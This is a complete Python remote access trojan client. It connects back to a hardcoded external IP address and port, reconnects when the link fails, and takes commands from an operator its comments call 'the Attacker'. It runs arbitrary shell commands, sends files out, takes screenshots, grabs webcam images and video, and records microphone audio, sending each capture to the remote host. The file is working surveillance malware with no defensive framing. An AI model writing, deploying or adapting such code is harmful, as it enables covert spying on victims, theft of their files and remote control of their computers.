import subprocess
import socket
import time
import cv2
import os 
from scipy.io.wavfile import write
from PIL import ImageGrab
import sounddevice

def socket_create():
	try:
		global host
		global port
		global s
		host = '193.161.193.99' # your ip
		port = 57492
		#host = '192.168.43.101' # your ip
		#port = 4278
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))

def socket_connect():
	try:
		global host
		global port
		global s
		s.connect((host,port))
	except socket.error as msg:
		print("Socket connection error: " + str(msg))
		time.sleep(3)
		socket_connect()

def receive_commands():
	
	while True:

		print('RECIEVING')
		data = str(s.recv(20480), 'utf-8')
		print('RECIEVED: ' + data)

		if len(data) > 0:	
			# Send File to Attacker		
			if data[0:8] == 'download':		
				upload(data[:])	
			# Recieved File to Attacker
			elif data[0:6] == 'upload':
				download(data[7:])
			# Screenshot
			elif data[0:10] == 'screenshot':
				screenshot(data[11:])
			# Camera Snap
			elif data[0:6] == 'camera':
				camera(data[7:])
			# Video Record
			elif data[0:9] == 'video_rec':
				video_record(data[10:])
			# Voice Record
			elif data[0:9] == 'voice_rec':
				voice_record(data[10:])
			# The Attacker is Connected
			elif data[0:14] == 'connected_1284':
				s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			# No Data Recieved
			elif data[0:11] == 'nosent_1486':
				s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			# Change Directory
			elif data[0:2] == 'cd': 
				change_directory(data[:])
			# Clear Screen
			elif data[:] == 'clear':
				s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			# Quit Session
			elif data[:] == 'quit':
				break
				
			else:
				try:
					# Recieved Other Command
					cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					output_bytes = cmd.stdout.read() + cmd.stderr.read() 
					output_str = str(output_bytes, 'utf-8')
					s.send(str.encode(output_str + '\n' + str(os.getcwd()) + '> '))
					print(output_str)
				except Exception as msg:
					output_str = 'Command not recognized: ' + str(msg) + '\n'
					s.send(str.encode(output_str + str(os.getcwd()) + '> '))
					print(output_str)
	s.close()

def change_directory(cmd):
	if cmd[3:] == '':
		s.send(str.encode(str(os.getcwd()) + '> '))
	else:
		try:
			os.chdir(cmd[3:])
			command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = command.stdout.read() + command.stderr.read() 
			output_str = str(output_bytes, 'utf-8')
			s.send(str.encode( str(os.getcwd()) + '> '))
		except:
			s.send(str.encode('The system cannot find the path specified.' + '\n\n' + str(os.getcwd()) + '> '))

def upload(cmd):
	file_Name = cmd[9:]			
	if (os.path.exists(file_Name)):
		
		s.send(str.encode('FILE FOUND', 'utf-8'))
		print()
		print('  [!] FILE FOUND')		
		print('  [*] Uploading: ' + file_Name)
		file_Size = os.path.getsize(file_Name)
		
		print('  [*] File size: ' + str(file_Size))
		print('  [*] Uploading...')
		s.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1) # please do not delete this one, timing to avoid buffer over flow

		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			s.send(data)
			data = f.read(20480)
			
		time.sleep(1)
		s.send(str.encode('COMPLETE'))
		f.close()

		client_response = str(s.recv(20480), 'utf-8')
		if client_response == 'DOWNLOAD COMPLETE':
			s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			print('  [!] UPLOADING COMPLETE')
			print('  [!] Closing')

	else:
		s.send(str.encode('file not found', 'utf-8'))
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] FILE NOT FOUND')
		print('  [*] Please Try Again')
		print()

def download(cmd):
	if cmd != 'not found 59269164':
		print()
		print('  [!] FILE FOUND')
		
		file_Name = cmd
		file_Size = str(s.recv(1024), 'utf-8')
		f = open(file_Name, 'wb')

		print('  [*] File Name: ' + file_Name )
		print('  [*] File size: ' + file_Size )
		print('  [!] Downloading...')

		data = s.recv(int(20480))

		while not ('COMPLETE' in str(data)): 
			f.write(data)
			data = s.recv(20480)
		f.close()

		s.send(str.encode('upload_complete_1243','utf-8'))	
		print('  [!] DOWNLOADING COMPLETE')
		print()

		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	

	else:
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] FILE NOT FOUND')
		print('  [*] Please Try Again')
		print()

def screenshot(cmd):
	try:
		file_Name = cmd

		print()
		print('  [!] SCREENSHOT')		
		print('  [*] File Name: ' + file_Name)

		screenshot = ImageGrab.grab()
		screenshot.save(file_Name)
		file_Size = os.path.getsize(file_Name)
		
		s.send(str.encode('CAPTURING_SCREEN', 'utf-8'))
		time.sleep(1)
			
		print('  [*] File size: ' + str(file_Size))
		print('  [*] Uploading Screenshot...')
		s.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1) # please do not delete this one, timing to avoid buffer over flow

		
		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			s.send(data)
			data = f.read(20480)

		time.sleep(1)
		f.close()
		s.send(str.encode('COMPLETE'))
		

		client_response = str(s.recv(20480), 'utf-8')
		if client_response == 'SCREENSHOT COMPLETE':
			os.remove(file_Name)
			s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			print('  [!] UPLOADING SCREENSHOT COMPLETE')
			print()

	except Exception as msg:
		s.send(str.encode(str(msg), 'utf-8'))
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] SCREENSHOT FAILED: ' + str(msg))
		print('  [*] Please Try Again')
		print()

def camera(cmd):
	try:
		file_Name = cmd

		print()
		print('  [!] CAMERA SNAP')
		print('  [*] File Name: ' + str(file_Name))

		camsnap = cv2.VideoCapture(0)
		ret, img = camsnap.read()
		cv2.imwrite(file_Name, img)
		del(camsnap)
		file_Size = os.path.getsize(file_Name)

		s.send(str.encode('CAPTURING_CAMERA', 'utf-8'))
		
		print('  [*] File size: ' + str(file_Size))
		print('  [*] Uploading Camsnap...')
		s.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1) # please do not delete this one, timing to avoid buffer over flow

		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			s.send(data)
			data = f.read(20480)
			
		time.sleep(1)
		s.send(str.encode('COMPLETE'))
		f.close()

		client_response = str(s.recv(20480), 'utf-8')
		if client_response == 'CAMSNAP COMPLETE':
			os.remove(file_Name)
			s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			print('  [!] UPLOADING CAMERASNAP COMPLETE')
			print()

	except Exception as msg:
		s.send(str.encode(str(msg), 'utf-8'))
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] CAMERASNAP FAILED')
		print('  [*] Please Try Again')
		print()

def voice_record(cmd):	
	try:
		file_Name = 'AudioRecord.wav'
		duration = int(cmd)
		fs = 44100

		print()
		print('  [!] VOICE RECORD')
		print('  [!] Recording, Please wait for: ' + str(duration) + 'sec')

		rec_voice = sounddevice.rec(int(duration * fs), samplerate = fs, channels = 2)
		s.send(str.encode('VOICE_RECORDING', 'utf-8'))
		sounddevice.wait()
		write(file_Name, fs, rec_voice)
		file_Size = os.path.getsize(file_Name)

		print('  [*] File Name: ' + file_Name)
		print('  [*] File size: ' + str(file_Size))
		print('  [*] Uploading Voice Record...')
		s.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1) # please do not delete this one, timing to avoid buffer over flow

		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			s.send(data)
			data = f.read(20480)
			
		time.sleep(1)
		s.send(str.encode('COMPLETE'))
		f.close()

		client_response = str(s.recv(20480), 'utf-8')
		if client_response == 'VOICE RECORD COMPLETE':
			os.remove(file_Name)
			s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			print('  [!] UPLOADING VOICE RECORD COMPLETE')
			print()

	except Exception as msg:
		s.send(str.encode(str(msg), 'utf-8'))
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] VOICE RECORD FAILED')
		print('  [*] Please Try Again')
		print()

def video_record(cmd):	
	try:
		file_Name = 'VideoRecord.avi'
		duration = int(cmd) * 10

		print()
		print('  [!] VIDEO RECORD')
		print('  [!] Recording, Please wait for: ' + str(duration) + ' sec')

		s.send(str.encode('VIDEO_RECORDING', 'utf-8'))
		
		cap = cv2.VideoCapture(0)
		fourcc = cv2.VideoWriter_fourcc(*'XVID')
		out = cv2.VideoWriter(file_Name,fourcc, 10, (640,480))
		
		for x in range(0,duration):
			ret, frame = cap.read() 
			gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) 
			out.write(frame) 
			print(x)
			time.sleep(0.00001)

		cap.release() 
		out.release() 
		cv2.destroyAllWindows()

		file_Size = os.path.getsize(file_Name)

		print('  [*] File Name: ' + file_Name)
		print('  [*] File size: ' + str(file_Size))
		print('  [*] Uploading Video Record...')
		s.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1) # please do not delete this one, timing to avoid buffer over flow

		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			s.send(data)
			data = f.read(20480)
			
		time.sleep(1)
		s.send(str.encode('COMPLETE'))
		f.close()

		client_response = str(s.recv(20480), 'utf-8')
		if client_response == 'VIDEO RECORD COMPLETE':
			os.remove(file_Name)
			s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))
			print('  [!] UPLOADING VIDEO RECORD COMPLETE')
			print()

	except Exception as msg:
		s.send(str.encode(str(msg), 'utf-8'))
		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
		print()
		print('  [!] VIDEO RECORD FAILED')
		print('  [*] Please Try Again')
		print()

def main():
	global s
	try:
		socket_create()
		socket_connect()
		receive_commands()
	except Exception as msg:
		print('Error in main: ' + str(msg))
		time.sleep(3)
	s.close()
	main()
main()
